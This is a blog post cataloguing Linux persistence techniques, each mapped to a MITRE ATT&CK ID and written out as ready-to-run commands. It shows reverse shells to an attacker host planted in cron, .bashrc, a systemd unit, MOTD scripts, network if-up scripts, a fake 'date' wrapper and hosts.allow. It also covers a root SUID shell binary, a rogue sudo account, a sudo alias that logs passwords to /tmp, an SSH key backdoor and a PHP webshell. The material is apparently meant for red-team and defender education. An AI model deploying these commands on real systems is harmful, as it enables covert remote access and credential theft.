---
layout: single
title: "Common Linux Persistence Techniques"
excerpt: "The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. "
date: 2021-05-10 00:22:00 -0000
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: 
categories: linux
permalink: /linux/persistence
tags: [linux, persistence]

---

This post will cover a few common Linux persistence techniques used by an adversary to establish permanent access. This blog assumed that you have basic knowledge of Linux OS such as Linux service, user privilege, crontab, remote management, reverse shell etc. It is also noted that root privilege is required to conduct mostly techniques used in this blog. The adversaries are attempting to keep their foothold. Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access.

---
## Creating privilege account

[MITRE ID: T1136.001](https://attack.mitre.org/techniques/T1136/001/)

The adversary tends to create a high privilege account to maintain access to the compromised system. They usually create a user with a sudo privilege across the system.

Required: root privilege

	$ Command: 
	
	victim@server$ sudo useradd -m -s /bin/bash nginx
	victim@server$ sudo usermod -aG sudo nginx
	victim@server$ sudo passwd nginx
	

    
## Creating SUID Binary

[MITRE ID: T1548.001](https://attack.mitre.org/techniques/T1548/001/)

A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that runs the binary will have access to the system with the root privilege. Below is an example of creating a SUID binary named suid00r.

Required: root privilege

	$ Command:
	
	root@victim$ tempdir="/var/tmp"
	
	root@victim$ echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $tempdir/suid00r.c
	root@victim$ gcc $tempdir/suid00r.c -o $tempdir/suid00r 2>/dev/null
	root@victim$ rm $tempdir/suid00r.c
	root@victim$ chown root:root $tempdir/suid00r
	root@victim$ chmod 4777 $tempdir/suid00r

## Creating cron job

[MITRE ID: T1053.003](https://attack.mitre.org/techniques/T1053/003/)

The crontab file contains a list of tasks that you wish to execute on a regular basis, as well as the name of the command that manages them. Crontab stands for "cron table," as it executes tasks using the cron job scheduler. 

The adversary can create a reverse shell that points to their C2 server using the cron job every 12th hour. Below is a simple example of bash reverse shell as for the PoC.

Noted: `0 */12 * * *` means "At minute 0 past every 12th hour."

Required: root or normal user privilege

	$ Command:
	
	root@victim$ (crontab -l > .tab ; echo "0 */12 * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERIP/4444 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1

## Creating .bashrc backdoor

[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)

A bashrc file is a shell script file that Linux uses when starting up to load items like modules and aliases into a user's profile. So, whenever an interactive session is launched, the .bashrc file will load the reverse shell pointing to the adversary C2 server.

Required: root or normal user privilege

	$ Command:
	
	victim@server$ echo "(setsid bash 1>&/dev/tcp/$ATTACKERIP/5555 0>&1 & ) 2>/dev/null" >> ~/.bashrc

## Creating .bashrc alias

[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)

Same as the .bashrc backdoor but it leverages Linux alias. When we often need to use a single large command several times, we construct an alias for it.
Alias is a shortcut command that performs the same functions as if we typed the entire command. 

As for the PoC, we use `sudo` alias. Whenever the user types sudo command for example "`sudo netstat -plnt`", the sudo alias will load then ask for the user's password and dump the plaintext password to the /tmp/dumper directory before the legitimate sudo binary from `/usr/bin/sudo` spawn.

Required: root or normal user privilege

	$ Command:
	
	victim@server$ echo "alias sudo='echo -n "[sudo] password for "\$USER": " && read -r password && echo ""\$password"" >/tmp/dumper && /usr/bin/sudo \$@'" >> ~/.bashrc

## Creating systemd backdoor 

[MITRE ID: T1543.002](https://attack.mitre.org/techniques/T1543/002/)

FFor Linux operating systems, Systemd is a system and service manager. It includes capabilities such as the parallel launch of system services at boot time, on-demand activation of daemons, and dependency-based service control logic, and is meant to be backwards compatible with SysV init scripts.

As for the PoC, we create `backdoorx` service in /etc/systemd/system/ directory. Whenever the system start and the network is ready, it will establish a reverse shell to adversary C2.

Required: root privilege

	$ Command:
	
	root@victim$ SYSTEMD_NAME='backdoorx'
	
	root@victim$ cat << EOF > /etc/systemd/system/$SYSTEMD_NAME.service
	[Unit]
	After=network-online.target
	[Service]
	Type=simple
	ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$ATTACKERIP/6666 0>&1"
	[Install]
	WantedBy=multi-user.target'
	EOF
	
	root@victim$ systemctl daemon-reload
	root@victim$ systemctl start $SYSTEMD_NAME.service
	root@victim$ systemctl enable $SYSTEMD_NAME.service

## Creating SSH authorized_keys

[MITRE ID: T1098.004](https://attack.mitre.org/techniques/T1098/004/)

In SSH, the authorized keys file defines the SSH keys that can be used to login into the user account for whom the file is set up. It's a crucial configuration file since it sets up persistent access through SSH keys.

As for the PoC, we simulate the adversary SSH Public Key that commonly known as id_rsa.pub that is placed on the server we intend to log in to.

Required: root or normal user privilege

	$ Command:
	
	victim@server$ echo 'ssh-rsa AAAAB3Nza7Y-SNIP-6v6tgj6V5Dt root@C2box' >> ~/.ssh/authorized_keys
	attacker@C2$ ssh victim@server

## Creating SSH MOTD banner

When you use SSH to log into a machine, a banner called Motd (Message of the Day) shows. Motd scripts for Ubuntu/Debian may be found in /etc/update-motd.d/. 

As for the PoC, we created a MOTD banner named 20-motd-bas that will make a reverse shell to the adversary C2 server whenever any user login via SSH.

Required: root privilege

	$ Command:
	
	root@victim$ MOTDNAME='20-motd-bas'
	root@victim$ cat << EOF > /etc/update-motd.d/$MOTDNAME
	#!/bin/sh
	# Creating SSH motd banner
	/bin/bash -c "bash -i >& /dev/tcp/$ATTACKERIP/7777 0>&1" &
	EOF
	root@victim$ chmod +x /etc/update-motd.d/$MOTDNAME

How does it work? At each login, pam motd(8) as the root user invokes executable scripts in /etc/update-motd.d/*, and this information is concatenated in /var/run/motd. The run-parts(8) –lsbsysinit option controls the order in which scripts are executed (essentially alphabetical order, with a few exceptions) [1]. 

## Creating Webshell as backdoor

[MITRE ID: T1505.003](https://attack.mitre.org/techniques/T1505/003/)

Adversary commonly placed a webshell for later access. A simple PoC is shown below.

Required: root or web server privilege

	$ Command:
	victim@server$ WEBSHELL='bdoor.php'
	victim@server$ PATH2WEBSHELL=/var/www/html/secretfolder/$WEBSHELL

	victim@server$ cat << EOF > $PATH2WEBSHELL
	# Creating webshell 
	<?php
	    if (isset($_REQUEST['cmd'])) {
	        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	    }
	?>
	EOF

## Creating Network startup as backdoor

There are four directories in which scripts can be placed which will always be run for any interface during certain phases of ifup and ifdown commands. One of them is `/etc/network/if-up.d/`. Scripts in this directory are run after bringing the interface up [2].

Required: root privilege

	$ Command:
	
	root@victim$ STARTUPNAME='upsdoor'
	root@victim$ PATH2STARTUPNAME=/etc/network/if-up.d/$STARTUPNAME

	root@victim$ cat << EOF > $PATH2STARTUPNAME
	#!/bin/sh
	# Creating startup service 
	bash -i >& /dev/tcp/$ATTACKERIP/8888 0>&1 & 2>/dev/null
	EOF

	root@victim$ chmod +x $PATH2STARTUPNAME

## Creating binary wrapper

[MITRE ID: T1574.008](https://attack.mitre.org/techniques/T1574/008/)

An adversary may create a wrapper from a legitimate binary as simple as shown below. Whenever any user types command `date`, a reverse shell is spawned to the C2.

Required: root privilege

	$ Command:
	
	root@victim$ touch /usr/local/bin/date
	root@victim$ cat << EOF > /usr/local/bin/date
	#!/bin/bash
	# Creating binary wrapper
	bash -i >& /dev/tcp/$ATTACKERIP/9999 0>&1 & 2>/dev/null
	/bin/date $@
	EOF
	root@victim$ chmod +x /usr/local/bin/date

## Creating TCP wrapper

Basic traffic filtering of incoming network traffic is provided by TCP wrappers. Other systems can be granted or refused access to "wrapped" network services running on a Linux server [3].

TCP wrappers rely on two configuration files as the basis for access control:

-   ***/etc/hosts.allow***
-   ***/etc/hosts.deny***

These files are used to determine whether or not a client may connect to a network service on a remote host. 
As for PoC, if someone connects to any port on the target machine such as SSH, a reverse shell will be spawned to the adversary server.

Required: root privilege

	$ Command:

	root@victim$ echo -e "Creating TCP wrapper\nALL: ALL: spawn (bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERIP/4545 0>&1') & :allow" >> /etc/hosts.allow



## Reference
1. http://manpages.ubuntu.com/manpages/jammy/en/man5/update-motd.5.html
2. https://manpages.debian.org/testing/ifupdown/interfaces.5.en.html
3. https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/
4. https://attack.mitre.org/techniques/T1574/008/
5. https://attack.mitre.org/techniques/T1505/003/
6. https://attack.mitre.org/techniques/T1543/002/
